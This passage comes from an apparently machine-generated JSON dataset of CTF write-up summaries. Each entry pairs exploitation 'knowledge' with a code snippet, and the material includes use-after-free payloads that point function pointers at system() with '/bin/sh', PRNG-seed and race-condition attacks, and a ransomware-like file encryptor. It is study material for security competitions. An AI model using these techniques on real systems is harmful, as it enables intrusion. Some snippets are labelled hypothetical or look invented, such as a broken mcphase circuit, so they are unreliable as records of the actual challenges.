        "key": "```  \nccx q[0],q[128], `74583193119493` -> #6  \nadd #5, #6  \nnegate #5  \nadd #5, #3  \nnegate #5  \nccx q[449], #3, #4  \nadd #4, #5  \nnegate #5  \nadd #6, #5  \nnegate #5  \nadd #5, #6  \nx q[449];  \nccx q[0],q[128], `74583193119493` -> #6  \nccx q[0],q[129], `149166386238986` -> #6  \nadd #5, #6  \nnegate #5  \nadd #5, #3  \nnegate #5  \nccx q[449], #3, #4  \nadd #4, #5  \nnegate #5  \nadd #6, #5  \nnegate #5  \nadd #5, #6  \nx q[449];  \nccx q[0],q[129], `149166386238986` -> #6  \nccx q[0],q[130], `298332772477972` -> #6  \n```"
    },
    {
        "name": "quantum 2",
        "write_up": "dataset/raw/quantum 2.md",
        "type": "The type of this CTF challenge is **reverse**.",
        "competition": [
            "DiceCTF/2021",
            "https://ctftime.org/event/1236/tasks/"
        ],
        "score": 436,
        "max_score": 500,
        "difficulty": 0.872,
        "knowledge": [
            "In quantum computing challenges, especially when examining quantum circuits that use the Quantum Fourier Transform (QFT) for operations like addition, participants can analyze the circuit to reveal hidden classical numbers. This is achieved by identifying and extracting the rotation angles from multiply-controlled phase gates (`mcphase` gates), as these gates encode the addition of classical numbers to quantum states. The angle information, once converted and analyzed, can reveal the classical number in binary form. This method applies when circuits are optimized for quantum computations to include fewer qubits, as seen with QFT-based addition versus traditional reversible computing circuits. The key step involves translating the extracted rotation angles into a binary representation of the number being added, which can often be discerned from examining patterns in the numeral representations of the angles.  \n\n   **Example Process:**\n   - Use `grep` to extract specific gate information from the quantum assembly files (e.g., `grep mcphase circuit.qasm -A 0 > output.txt`).\n   - Analyze the rotation angles, especially looking for patterns with pi, and convert those angles to floating point numbers that can be represented as fractions. These fractions, when analyzed correctly, reveal a binary pattern that corresponds to the classical number being added.",
            "When working with quantum circuits that encode values in a repetitive pattern, as seen in some quantum computing challenges, it is possible to deduce significant numerical values essential for the challenge, like `N` in RSA-based encryption scenarios. This is done by recognizing patterns in the values being added during certain operations, such as the QFT-adder's usage. The pattern, once identified, can simplify the extraction of critical values needed to move forward, essentially by observing the sequence of numbers involved in the computational steps and identifying the underlying repetition or mathematical relationship.  \n\n   **Example Insight:**\n   - For challenges involving pattern recognition in sequences of numbers added during quantum operations, one might observe a repetitive sequence that, when analyzed, can reveal values like `N` in RSA encryption (e.g., a pattern like `N-a, N, a, a, N-2a, N, 2a, 2a, ...`). This insight significantly simplifies the process of extracting key values necessary for decrypting or further manipulating the encrypted data challenge presents."
        ],
        "key": "```python\n# Example of a vulnerable quantum circuit with mcphase gates\n# This is a hypothetical vulnerable code snippet based on the context provided\n\nfrom qiskit import QuantumCircuit\n\n# Create a quantum circuit with 3 qubits\nqc = QuantumCircuit(3)\n\n# Apply mcphase gates with potentially vulnerable angles\nqc.append(mcphase(0.96947586), [2, 0, 1])\nqc.append(mcphase(1.9389517), [2, 0, 1])\nqc.append(mcphase(3.8779034), [2, 0, 1])\nqc.append(mcphase(1.4726216), [2, 0, 1])\nqc.append(mcphase(15 * pi / 16), [2, 0, 1])\nqc.append(mcphase(15 * pi / 8), [2, 0, 1])\nqc.append(mcphase(7 * pi / 4), [2, 0, 1])\nqc.append(mcphase(3 * pi / 2), [2, 0, 1])\nqc.append(mcphase(pi), [2, 0, 1])\n\n# The mcphase function is not defined in Qiskit, this is a placeholder\n# for the purpose of illustrating the vulnerability context\ndef mcphase(angle):\n    # Hypothetical implementation of a multi-controlled phase gate\n    pass\n\n# The circuit is now set up with potentially vulnerable phase angles\n```"
    },
    {
        "name": "Quantum Key Distribution",
        "write_up": "dataset/raw/Quantum Key Distribution.md",
        "type": "crypto",
        "competition": [
            "GoogleCTF/2019/Quals",
            "https://ctftime.org/event/809/tasks/"
        ],
        "score": 92,
        "max_score": 500,
        "difficulty": 0.184,
        "knowledge": [
            "When tackling challenges related to Quantum Key Distribution (QKD) using the BB84 protocol, carefully choosing qubits and basis can simplify the problem. Specifically, selecting a qubit state of `0+1j` and a basis of `\"+\"` across all qubits ensures a predictable measurement result of `1`, making the key derivation process more straightforward. This approach bypasses randomness requirements imposed by some implementations, allowing for efficient generation of the shared key.  \n   **Example choices:**  \n   - Basis: `[\"+\" for i in range(512)]`  \n   - Qubits: `[{\"real\": 0, \"imag\": 1} for i in range(512)]`",
            "In cryptographic challenges involving XOR encryption for the flag, if you can determine the shared key used in encryption, apply XOR again with the known shared key to the encrypted message (often provided as an \"announcement\" in the challenge) to decrypt it. This method is applicable when the challenge provides a mechanism to generate or deduce the shared key (as in the case of a QKD challenge) and the length of the key is known (e.g., 128 bits in the example).  \n   **Example decryption steps:**  \n   - Derive the shared key: `shared_key = 2**128-1`  \n   - Apply XOR: `decrypted_key = hex(announcement^shared_key)`  \n   - Use the decrypted key to decrypt the message."
        ],
        "key": "```python\n#!/usr/bin/env python  \nimport urllib2  \nimport json\n\nbasis = [\"+\" for i in range(512)]  \nqubits = [{\"real\": 0, \"imag\": 1} for i in range(512)]  \nbody = {\"basis\": basis, \"qubits\": qubits}\n\nurl = \"https://cryptoqkd.web.ctfcompetition.com/qkd/qubits\"  \nreq = urllib2.Request(url)  \nreq.add_header('Content-Type','application/json')  \nresponse = json.loads(urllib2.urlopen(req, json.dumps(body)).read())\n\nserver_basis = response[\"basis\"]  \nannouncement = int(response[\"announcement\"],16)  \nshared_key = 2**128-1  \nprint(hex(announcement^shared_key))  \n```"
    },
    {
        "name": "QuinEVM",
        "write_up": "dataset/raw/QuinEVM.md",
        "type": "web",
        "competition": [
            "LakeCTF/2022",
            "https://ctftime.org/event/1728/tasks/"
        ],
        "score": 388,
        "max_score": 488,
        "difficulty": 0.7950819672131147,
        "knowledge": [
            "To satisfy a smart contract's condition that requires the contract's bytecode to equal its output (quine requirement) in a blockchain CTF challenge, one can use minimal EVM assembly instructions for quine functionality. This involves using `CODESIZE`, `CALLVALUE`, and `CODECOPY` instructions to make the contract return its own bytecode. A contract must be crafted such that it is self-replicating, i.e., upon execution, it outputs its own bytecode. The payload for creating such a contract in EVM bytecode could look like this: `383434393834F3`, where each pair of hex digits represents a specific EVM instruction or operand that contributes to the quine's behavior.",
            "When testing a blockchain-related exploit, especially in Ethereum, tools like Truffle can significantly streamline the process. Truffle allows for easy compilation, deployment, and testing of smart contracts against a local blockchain. By creating a contract that deploys another contract containing the exploit (using the `CREATE` opcode in EVM for deployment) and asserting the conditions for the CTF challenge (like matching bytecodes to confirm the quine property), one can validate the effectiveness of their exploit in a controlled environment. This method is beneficial when interacting with contracts that have complex conditions or when attempting to ensure that an exploit works as intended before submitting it to a live CTF challenge or deploying it on the main network."
        ],
        "key": "```python  \ndef verify(addr):  \n   code = web3.eth.get_code(addr)  \n   if not 0 < len(code) < 8:  \n       return False\n\n   contract = web3.eth.contract(addr, abi=[ { \"inputs\": [], \"name\": \"quinevm\",\n\"outputs\": [ { \"internalType\": \"raw\", \"name\": \"\", \"type\": \"raw\" } ],\n\"stateMutability\": \"view\", \"type\": \"function\" } ])  \n   return contract.caller.quinevm() == code\n\nif __name__ == \"__main__\":  \n   addr = input(\"addr? \").strip()  \n   if verify(addr):  \n       gib_flag()  \n   else:  \n       print(\"https://i.imgflip.com/34mvav.jpg\")  \n```\n\n```solidity  \ncontract Attack {  \n   event Result(address addr, bytes bytecode);\n\n   function deployBytecode(bytes memory bytecode) public returns (address) {  \n       address addr;  \n       uint256 length = bytecode.length;  \n       assembly {  \n           addr := create(  \n               0,                   \n               add(bytecode, 0x20), \n               length               \n           )  \n       }  \n       emit Result(addr, addr.code);  \n       return addr;  \n  }  \n}  \n```\n\n```solidity  \nimport \"../contracts/Attack.sol\";\n\ncontract TestAttack {  \n   function testAttack() public {  \n       Attack attack = Attack(DeployedAddresses.Attack());\n\n       bytes memory bytecode = hex\"383434393834F3\";  \n       require(bytecode.length < 8, \"BYTECODE_LENGTH_TOO_LONG\");  \n  \n       address addr = attack.deployBytecode(bytecode);  \n       bytes memory bytecode_deployed = addr.code;\n\n       Assert.equal(keccak256(bytecode), keccak256(bytecode_deployed), \"bytecode mismatch\");  \n   }  \n}  \n```"
    },
    {
        "name": "Quotebook",
        "write_up": "dataset/raw/Quotebook.md",
        "type": "pwn",
        "competition": [
            "DaVinci/2021",
            "https://ctftime.org/event/1296/tasks/"
        ],
        "score": 499,
        "max_score": 499,
        "difficulty": 1.0,
        "knowledge": [
            "In a challenge involving use-after-free vulnerabilities, when dealing with a structure that includes function pointers (`write` and `read` methods), one can overwrite these pointers with the address of a system function (`system()`) if they successfully leak a libc address by crafting structures on the heap. This approach requires manipulating allocations and deallocations to control the contents of freed memory. A precise manipulation of the heap can allow an attacker to construct fake structures pointing to critical application or library data (e.g., GOT) and leak function addresses such as `printf` to calculate the `system()` address.\n   \n   **Condition**: This knowledge applies when an application's logic includes creating, deleting, and reading from dynamically allocated structures that contain function pointers, alongside a vulnerability that allows heap manipulation (use-after-free).\n   \n   **Example payload**: \n   ```\n   b = b\"/bin/sh\\x00\" + pwn.pack(1, 64)\n   b += b\"A\"* 16\n   b += pwn.pack(system_addr, 64) * 2\n   ```",
            "To leak a libc address in a binary exploitation challenge where direct leaks are not immediately possible, consider hijacking the control flow via a use-after-free vulnerability by placing pointers to the GOT in unused/freed struct fields. This technique enables reading out libc addresses and thus calculating the base address of libc to bypass ASLR. The essential steps involve creating controlled allocations and deallocations to \"resurrect\" a freed structure and modify its fields, exploiting the application's functionality to read or write based on these manipulated structures.\n\n   **Condition**: Effective in scenarios where control over the application's allocation and freeing of memory allows manipulating the heap to point struct fields to critical sections like the GOT, leveraging functionalities (e.g., printing a struct) to leak addresses.\n\n   **Example payload**:\n   ```\n   buf = pwn.pack(RANDOM_BUF, 64) + pwn.pack(1, 64)\n   buf += pwn.pack(PRINTF_ADDR, 64) + pwn.pack(8, 64)\n   buf += pwn.pack(0x401236, 64) + pwn.pack(0x401294, 64)\n   ```"
        ],
        "key": "```c\nint choice = get_choice(\"Quote number\");  \nif(choice < 1 || choice >= book_ctr + 1)  \n{  \n    puts(\"[!] Error : wrong quote number !\");  \n}  \nelse  \n{  \n    free(book[choice - 1]);  \n    book_ctr--;  \n}  \n```"
    },
    {
        "name": "Race Against The Machine",
        "write_up": "dataset/raw/Race Against The Machine.md",
        "type": "The type of the challenge described in this write-up is a `pwn` challenge.",
        "competition": [
            "NuitduHack/2018/Quals",
            "https://ctftime.org/event/583/tasks/"
        ],
        "score": 200,
        "max_score": 600,
        "difficulty": 0.3333333333333333,
        "knowledge": [
            "To exploit a race condition vulnerability in web applications, a script that simultaneously sends multiple requests using threads can be effective. This approach is particularly useful when needing to achieve an action (e.g., purchasing an item) under certain conditions before a change in state occurs (such as a promotion ending or item availability decreasing). The script should create numerous threads, each performing the action that triggers the race condition. This method increases the likelihood of successfully exploiting the race condition by overcrowding the request handling, hence bypassing normal sequential processing.",
            "For tracking success in exploiting a race condition, the script should include functions to validate the outcome of the exploitation. In the context of this challenge, the script checks each thread (or user account) for a milestone, such as a specific account balance threshold being exceeded (indicating successful exploitation and gaining of an unintended advantage, such as extra miles or credits). Leveraging regular expressions to parse response data for verification purposes is a practical approach. This strategy allows for automated and efficient determination of whether the exploitation attempt succeeded across the different threads.\n\nSample validation logic (adapted and simplified):\n```\nimport re\n\ndef check_success(response_text):\n    match = re.search(r\".*Balance : (\\d+) Miles\", response_text)\n    if match and int(match.group(1)) > 1400:\n        return True\n    return False\n```"
        ],
        "key": "```php\n<?php\nsession_start();\ninclude 'db.php';\n\nfunction buy_ticket($user_id, $flight_id) {\n    global $db;\n    \n    // Check if the user is eligible for a discount\n    $query = \"SELECT * FROM purchases WHERE user_id = ?\";\n    $stmt = $db->prepare($query);\n    $stmt->execute([$user_id]);\n    $purchases = $stmt->fetchAll();\n\n    if (count($purchases) == 0) {\n        // First purchase, apply discount\n        $discount = 0.5;\n    } else {\n        $discount = 0;\n    }\n\n    // Get flight price\n    $query = \"SELECT price FROM flights WHERE id = ?\";\n    $stmt = $db->prepare($query);\n    $stmt->execute([$flight_id]);\n    $flight = $stmt->fetch();\n\n    if ($flight) {\n        $price = $flight['price'] * (1 - $discount);\n\n        // Check if user has enough miles\n        $query = \"SELECT miles FROM users WHERE id = ?\";\n        $stmt = $db->prepare($query);\n        $stmt->execute([$user_id]);\n        $user = $stmt->fetch();\n\n        if ($user && $user['miles'] >= $price) {\n            // Deduct miles and add purchase\n            $new_miles = $user['miles'] - $price;\n            $query = \"UPDATE users SET miles = ? WHERE id = ?\";\n            $stmt = $db->prepare($query);\n            $stmt->execute([$new_miles, $user_id]);\n\n            $query = \"INSERT INTO purchases (user_id, flight_id) VALUES (?, ?)\";\n            $stmt = $db->prepare($query);\n            $stmt->execute([$user_id, $flight_id]);\n\n            return true;\n        }\n    }\n    return false;\n}\n\nif ($_SERVER['REQUEST_METHOD'] == 'POST') {\n    $user_id = $_SESSION['user_id'];\n    $flight_id = $_POST['idFlightPost'];\n\n    if (buy_ticket($user_id, $flight_id)) {\n        echo \"Ticket purchased successfully!\";\n    } else {\n        echo \"Failed to purchase ticket.\";\n    }\n}\n?>\n```"
    },
    {
        "name": "race wars",
        "write_up": "dataset/raw/race wars.md",
        "type": "reverse",
        "competition": [
            "DEFCON/2018/Quals",
            "https://ctftime.org/event/608/tasks/"
        ],
        "score": 135,
        "max_score": 500,
        "difficulty": 0.27,
        "knowledge": [
            "In vulnerabilites involving improper memory bounds checks, if the application does not enforce strict bounds on array or buffer sizes, it can lead to arbitrary read and write vulnerabilities. This can be exploited by setting a variable to its maximum possible value, which allows manipulating memory beyond the intended bounds. Example scenario could involve setting a transmission struct's gears_num to 0xffffffffffffffff to gain arbitrary read and write access.",
            "To exploit integer overflow vulnerabilities, carefully crafted user input can cause an integer variable to wrap around and become zero or a much smaller value than intended. This can be demonstrated by requesting an abnormally large number of objects (e.g., tire pairs), leading the application to allocate insufficient memory and thus allowing for adjacent memory space exploitation. Example payload: choosing 2**27 tire pairs to cause integer overflow and manipulate adjacent memory structures."
        ],
        "key": "```c  \nunsigned __int64 __fastcall upgrade_transmission(transmission_struct\n*transmission)  \n{  \n __int64 inserted_value; // [rsp+10h] [rbp-20h]  \n __int64 confirm; // [rsp+18h] [rbp-18h]  \n __int64 selected_gear; // [rsp+20h] [rbp-10h]  \n unsigned __int64 v5; // [rsp+28h] [rbp-8h]\n\n v5 = __readfsqword(0x28u);  \n inserted_value = -1LL;  \n confirm = -1LL;  \n selected_gear = -1LL;  \n printf(\"ok, you have a transmission with %zu gears\\n\",\ntransmission->gears_num);  \n printf(\"which gear to modify? \");  \n __isoc99_scanf(\"%zu\", &inserted_value);  \n if ( transmission->gears_num > (unsigned __int64)--inserted_value )  \n {  \n   printf(  \n     \"gear ratio for gear %zu is %zu, modify to what?: \",  \n     inserted_value + 1,  \n     (unsigned __int8)transmission->ratios[inserted_value + 1]);  \n   selected_gear = inserted_value;  \n   __isoc99_scanf(\"%zu\", &inserted_value);  \n   printf(\"set gear to %d\\n? (1 = yes, 0 = no)\", inserted_value);  \n   __isoc99_scanf(\"%zu\", &confirm);  \n   if ( confirm )  \n     transmission->ratios[selected_gear + 1] = inserted_value;  \n }  \n else  \n {  \n   puts(\"ERROR: can't modify this gear.\");  \n }  \n return __readfsqword(0x28u) ^ v5;  \n}  \n```  \n\n```c  \n puts(\"how many pairs of tires do you need?\");  \n __isoc99_scanf(\"%d\", &tires_pairs);  \n if ( tires_pairs <= 1 )  \n {  \n   puts(\"you need at least 4 tires to drive...\");  \n   exit(1);  \n }  \n v5 = 32 * tires_pairs;  \n v6 = (tyre_struct *)get_object_memory((custom_arena *)buffer, 32 *\ntires_pairs);  \n if ( v6 )  \n   *tires_num = 2 * tires_pairs;  \n```\n\n```c  \nvoid __fastcall cleaning_up(custom_arena *buffer)  \n{  \n custom_arena *ptr; // ST10_8  \n custom_arena *next_arena; // [rsp+18h] [rbp-18h]  \n bin_struct *j; // [rsp+20h] [rbp-10h]  \n function_struct *i; // [rsp+28h] [rbp-8h]\n\n for ( i = (function_struct *)buffer->functions_list; i; i = (function_struct\n*)i->next_func )  \n {  \n   if ( i->function )  \n     ((void (__fastcall *)(_QWORD))i->function)(i->arg);  \n }  \n```"
    },
    {
        "name": "RACHELL",
        "write_up": "dataset/raw/RACHELL.md",
        "type": "pwn",
        "competition": [
            "TSG/2020",
            "https://ctftime.org/event/1004/tasks/"
        ],
        "score": 322,
        "max_score": 428,
        "difficulty": 0.7523364485981309,
        "knowledge": [
            "In scenarios involving pseudo file systems or simplified shells lacking certain commands (e.g., 'cat'), vulnerabilities may exist if specific commands fail to properly validate output. If a command (like 'pwd') prints output without validation and checking for allowed characters, this can be exploited to bypass output restrictions and potentially disclose sensitive information. This knowledge can be applied to find similar vulnerabilities in programs or challenges with custom shells or file systems. Example approach: Investigating custom implementations of shell commands to identify missing validations can lead to finding leaks or bypasses.",
            "For challenges involving heap exploitation, if a program implements custom deletion (e.g., 'rm' command that removes files or directories) that handles node unlinking inconsistently or improperly, it could introduce Use-After-Free (UAF) and Double Free vulnerabilities. This can be exploited by manipulating the heap to achieve arbitrary code execution or disclosure of sensitive information. When examining a program for heap-related vulnerabilities, paying attention to how it handles memory allocations, deallocations, and linkages between data structures can reveal exploitable flaws. Example payload generation involves careful crafting of input to trigger these conditions, often requiring a deep understanding of the heap manager's internals and the target's memory layout."
        ],
        "key": "```c  \nvoid sub_pwd(struct node *d)  \n{  \n if(d->p == &root){  \n   write(1,\"/\",1);  \n   print_name_with_check(d);  \n   return;  \n }  \n sub_pwd(d->p);  \n write(1,\"/\",1);  \n write(1,d->name,strlen(d->name)); // awful mistake  \n}  \n```\n\n```c  \nvoid sub_rm(struct node *target)  \n{  \n if(target == &root){  \n   write(1,\"not allowed\\n\",12);  \n   return;  \n }  \n if(target->p == cwd){  \n   switch(target->type){  \n     case FIL:  \n       if(target->buf != NULL)  \n         free(target->buf);  \n       unlink_child(target);  \n       break;  \n     case DIR:  \n       unlink_child(target);  \n       free(target);  \n       break;  \n     default:  \n       panic();  \n   }  \n }else{  \n   switch(target->type){  \n     case FIL:  \n       if(target->buf != NULL)  \n         free(target->buf);  \n       break;  \n     case DIR:  \n       unlink_child(target);  \n       free(target);  \n       break;  \n     default:  \n       panic();  \n   }  \n }  \n}  \n```\n\n```c  \n if(target->buf == NULL){  \n   target->buf = malloc(size);  \n   // find newline  \n   for(int ix=0; ix!=size; ++ix){  \n     if(content[ix] == '\\r'){  \n       size = ix;  \n       break;  \n     }  \n   }  \n   memcpy(target->buf,content,size);  \n   target->size = size;  \n```  "
    },
    {
        "name": "RageQuit",
        "write_up": "dataset/raw/RageQuit.md",
        "type": "crypto",
        "competition": [
            "BalCCon/2020",
            "https://ctftime.org/event/1100/tasks/"
        ],
        "score": 497,
        "max_score": 497,
        "difficulty": 1.0,
        "knowledge": [
            "When encountering file encryption malware in a CTF challenge, specifically using `xchacha20-poly1305`, files are encrypted by reading the original file, encrypting it, and overwriting the original content with random bytes from `/dev/urandom` to prevent file recovery. The initialization vector (nonce) for encryption can often be found in the beginning bytes of the encrypted file. Knowing this format can be critical in designing an approach for decryption once the encryption key is obtained.",
            "In challenges involving complex key derivation or operation sequences, reverse-engineering the malware's code can reveal that the key is manipulated through a series of mathematical and bitwise operations (such as shifts, adds, multiplies, and xors) that sometimes can be partially reversible or brute-forced. Even when a direct inverse operation is not possible (e.g., multiplication by a number with no multiplicative inverse in the given modulus), the independent manipulation of bytes means one can attempt to recover the original key byte-by-byte. This process requires understanding the specific operations applied to the key and devising a method to reverse or brute-force these operations to recover the original encryption key.\n\nSample of payload to start reversing key manipulation (derived from context, actual reversing logic may vary):\n```\n$key[$i] ^= $key[$i - 1];  // Reverse XOR operation\n\n// Brute-force loop for key recovery, based on known manipulations \nfor($i = 0; $i < 0x100; $i++) {  \n    // Repeat manipulations here in reverse or as a brute-force check...\n}\n```"
        ],
        "key": "```c\nFILE *fp_in  = fopen(filename, \"rb+\");  \nFILE *fp_out = fopen(outname, \"wb\");  \nFILE *fp_rng = fopen(\"/dev/urandom\", \"r\");  \nchar buffer[0x1000]\n\nunlink(filename);\n\nwhile(1) {  \n\tsize = fread(buffer, 1, sizeof(buffer), fp_in);  \n\tif(feof(fp_in))  \n\t\tbreak;\n\n\t/* encrypt and write the output */  \n\tencrypt(buffer);  \n\tfwrite(buffer, size, 1, fp_out);\n\n\t/* rewind and overwrite with garbage */  \n\tfseek(fp_in, -size, SEEK_CUR);  \n\tfread(buffer, size, 1, fp_rng);  \n\tfwrite(buffer, size, 1, fp_in);\n\n}\n\n/* encrypt and write the output */  \nencrypt(buffer);  \nfwrite(buffer, size, 1, fp_out);\n\n/* rewind and overwrite with garbage */  \nfseek(fp_in, -size, SEEK_CUR);  \nfread(buffer, size, 1, fp_rng);  \nfwrite(buffer, size, 1, fp_in);  \n```"
    },
    {
        "name": "RAIId Shadow Legends",
        "write_up": "dataset/raw/RAIId Shadow Legends.md",
        "type": "pwn",
        "competition": [
            "angstrom/2021",
            "https://ctftime.org/event/1265/tasks/"
        ],
        "score": -1,
        "max_score": 300,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving uninitialized variables, especially in C++ programs, manipulating variables indirectly through unexpected inputs in earlier steps can lead to unintended behavior or vulnerabilities, allowing control over program logic. In the scenario of a game where skill level affects the outcome, providing unexpected input to an unrelated variable (`agreement`) to indirectly set the uninitialized `skill` variable can be exploited to control game flow or outcomes.\n   Example payload in Python:\n   ```python\n   p.sendline(b'yes\\0' + p32(0x539))\n   ```",
            "When dealing with programs that prompt for multiple inputs, carefully crafted inputs can overflow or inject into variables that are evaluated later in the program, even if they appear to be unrelated. Specifically, appending binary data (such as a crafted integer) to a string input where input sanitization or bounds checking is not properly conducted can alter program behavior in a favorable way.\n   Example payload in Python:\n   ```python\n   p.sendline('yes') # Regular input for program flow.\n   p.sendline(b'yes\\0' + p32(0x539)) # Injected input to manipulate the skill level.\n   ```"
        ],
        "key": "```cpp\nstruct character {  \n       int health;  \n       int skill;  \n       long tokens;  \n       string name;  \n};\n\nvoid play() {  \n       string action;  \n       character player;  \n       cout << \"Enter your name: \" << flush;  \n       getline(cin, player.name);  \n       cout << \"Welcome, \" << player.name << \". Skill level: \" << player.skill << endl;  \n       while (true) {  \n               cout << \"\\n1. Power up\" << endl;  \n               cout << \"2. Fight for the flag\" << endl;  \n               cout << \"3. Exit game\\n\" << endl;  \n               cout << \"What would you like to do? \" << flush;  \n               cin >> action;  \n               cin.ignore();  \n               if (action == \"1\") {  \n                       cout << \"Power up requires shadow tokens, available via in app purchase.\" << endl;  \n               } else if (action == \"2\") {  \n                       if (player.skill < 1337) {  \n                               cout << \"You flail your arms wildly, but it is no match for the flag guardian. Raid failed.\" << endl;  \n                       } else if (player.skill > 1337) {  \n                               cout << \"The flag guardian quickly succumbs to your overwhelming power. But the flag was destroyed in the frenzy!\" << endl;  \n                       } else {  \n                               cout << \"It's a tough battle, but you emerge victorious. The flag has been recovered successfully: \" << flag.rdbuf() << endl;  \n                       }  \n               } else if (action == \"3\") {  \n                       return;  \n               }  \n       }  \n}  \n```"
    },
    {
        "name": "RaKeeJaPassRPC",
        "write_up": "dataset/raw/RaKeeJaPassRPC.md",
        "type": "crypto",
        "competition": [
            "BalCCon/2020",
            "https://ctftime.org/event/1100/tasks/"
        ],
        "score": 466,
        "max_score": 497,
        "difficulty": 0.937625754527163,
        "knowledge": [
            "In cryptographic systems using Diffie-Hellman (DH) key exchange or DH-like mechanisms, carefully review the validation of externally provided parameters. If the server or receiving end does not validate these parameters adequately, an attacker can manipulate these to their advantage. For example, setting a parameter to zero can significantly alter the expected outcome of mathematical operations, leading to unintended behaviors such as bypassing authentication or altering the shared secret.",
            "During the analysis of cryptographic protocols, especially those involving complex operations for key generation, identify where the input variables come from and if all inputs are properly authenticated or checked. Finding a step where an input is directly taken from an untrusted source (like a client or user input) and used in security-critical operations without proper validation can reveal vulnerabilities. In this case, manipulating the value of `A` to be `0` demonstrates how control over a single parameter can compromise the entire key exchange process, making it possible to deduce the shared secret or pass authentication checks against the system's expectations. This method can be generalized to other cryptographic implementations that might overlook the necessity of parameter validation.\n\nExample payload: Setting `A = 0` in a client request manipulates the shared secret generation, leading to an exploitable condition."
        ],
        "key": "```python\nS = pow(A * pow(v, u, N), b, N)\n```"
    },
    {
        "name": "Random ECB",
        "write_up": "dataset/raw/Random ECB.md",
        "type": "crypto",
        "competition": [
            "UTCTF/2020",
            "https://ctftime.org/event/929/tasks/"
        ],
        "score": 50,
        "max_score": 1991,
        "difficulty": 0.025113008538422903,
        "knowledge": [
            "In AES ECB mode encryption, the key aspect is that each block is encrypted independently, which means the identical plaintext blocks will result in identical ciphertext blocks when encrypted with the same key. This property can be exploited to decipher parts of the plaintext if a predictable or controlled block of data can be inserted by the attacker, such as a block consisting of repeated characters ('aaaaaaaaaaaaaaa'). By manipulating the input and comparing the encrypted blocks, one can reveal the plaintext block by block.\n   \n   **Example exploitation technique**: If the attacker knows the structure of the plaintext (e.g., a known text concatenated with an unknown flag) and can insert a controlled block of text before the unknown part, they can brute-force each character of the unknown part by observing which input results in an identical ciphertext block, thereby revealing the hidden information.",
            "Implementing a brute-force approach to discover unknown characters in AES ECB encrypted messages requires carefully planning the inputs and comparing the resulting ciphertexts. When the encryption process adds a random prefix to the plaintext (e.g., a single character like 'A' half the time), this adds a layer of variability that can still be overcome. By submitting a specific pattern of characters ('a'*15, in this example) multiple times, an attacker can distinguish between ciphertexts generated with and without the prefix, based on the repeated block structure of ECB mode. This differential analysis can then be extended to guess and confirm each successive character of the unknown portion of the plaintext (e.g., a flag).\n\n   **Brute-force approach under variability**: To bypass the prefix randomness, the attacker can send the controlled input multiple times to ensure getting both versions of the ciphertext (with and without the random prefix). This establishes a baseline for comparison. Continuing with a trial-and-error process for each character position in the unknown plaintext by appending guessed characters to the controlled input allows the attacker to check for matching ciphertext patterns, successively revealing the full plaintext."
        ],
        "key": "```python\nimport os\nfrom Crypto.Cipher import AES\n\nFLAG = b\"utflag{3cb_w17h_r4nd0m_pr3f1x}\"\n\ndef pad(s):\n    return s + (16 - len(s) % 16) * chr(16 - len(s) % 16).encode()\n\ndef encrypt(plaintext, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(pad(plaintext))\n\ndef main():\n    key = os.urandom(16)\n    while True:\n        user_input = input(\"Input a string to encrypt (input 'q' to quit): \")\n        if user_input == 'q':\n            break\n        if os.urandom(1)[0] < 128:\n            plaintext = b\"A\" + user_input.encode() + FLAG\n        else:\n            plaintext = user_input.encode() + FLAG\n        ciphertext = encrypt(plaintext, key)\n        print(ciphertext.hex())\n\nif __name__ == \"__main__\":\n    main()\n```"
    },
    {
        "name": "Random Number Generator",
        "write_up": "dataset/raw/Random Number Generator.md",
        "type": "pwn",
        "competition": [
            "NACTF/2020",
            "https://ctftime.org/event/1157/tasks/"
        ],
        "score": 250,
        "max_score": 800,
        "difficulty": 0.3125,
        "knowledge": [
            "If a pseudorandom number generator (PRNG) uses system time as its seed, it's possible to predict future output by synchronizing the attack script's clock to the target server's clock, and then brute-forcing the seed within a certain time range. This is particularly viable when the seed is derived from a rounded or truncated version of the current time, making the seed space small enough to feasibly search through.\n   \n   Example payload snippet for syncing and bruteforcing the seed:\n   ```python\n   import time, random\n   current_time = time.time()\n   for offset in range(200):  # Brute-force within a small range around the current time\n       seed = round((current_time + offset / 1000) / 100, 5)\n       random.seed(seed)\n       # Continue with generating numbers and comparing to known output\n   ```",
            "The floating point precision of the seed value can be crucial when attempting to brute-force the state of a PRNG. To avoid missing the correct seed due to floating point rounding, it's necessary to carefully choose the granularity of the brute-force step, ensuring it's fine enough to account for the precision used in the seeding process but also coarse enough to make the brute-force search feasible within a reasonable time frame.\n\n   Example payload snippet for accounting for floating point precision in seed brute-forcing:\n   ```python\n   seed_attempt = round((current_time + offset / 1000) / 100, 5)\n   random.seed(seed_attempt)\n   # Proceed to generate numbers and check against known output, with `offset` adjusting the seed in small steps\n   ```"
        ],
        "key": "```python\nimport random, time  \nrandom.seed(round(time.time() / 100, 5))  \n```"
    },
    {
        "name": "randrevenge",
        "write_up": "dataset/raw/randrevenge.md",
        "type": "This write-up is for a reverse challenge.",
        "competition": [
            "nullconHackIM/2023-Berlin",
            "https://ctftime.org/event/1900/tasks/"
        ],
        "score": 475,
        "max_score": 482,
        "difficulty": 0.9854771784232366,
        "knowledge": [
            "When working on challenges involving prediction or manipulation of pseudo-random number sequences, consider whether the seed for the random sequence is based on a predictable or known value. If so, collecting pairs of seeds and their corresponding first generated number can narrow down potential seeds to test against the application logic.",
            "In scenarios where an application does not implement rate limiting, it allows for brute-force approaches. This means you can attempt a large number of requests to test different seeds or inputs without being blocked. Utilize this by designing a script to automate requests and analyze responses, continuing the process with new batches of inputs until the correct answer is found. \n\nSample Payload: Not applicable due to the context of the provided solution involving scripting and handling of responses rather than a single payload usage."
        ],
        "key": "```php\n<?php\nif (isset($_GET['seed'])) {\n    $seed = intval($_GET['seed']);\n    srand($seed);\n    $numbers = [];\n    for ($i = 0; $i < 10; $i++) {\n        $numbers[] = rand();\n    }\n    echo implode(\",\", $numbers);\n}\n?>\n```"
    },
    {
        "name": "randrevengerevenge",
        "write_up": "dataset/raw/randrevengerevenge.md",
        "type": "This write-up is for a crypto challenge.",
        "competition": [
            "nullconHackIM/2023-Berlin",
            "https://ctftime.org/event/1900/tasks/"
        ],
        "score": 482,
        "max_score": 482,
        "difficulty": 1.0,
        "knowledge": [
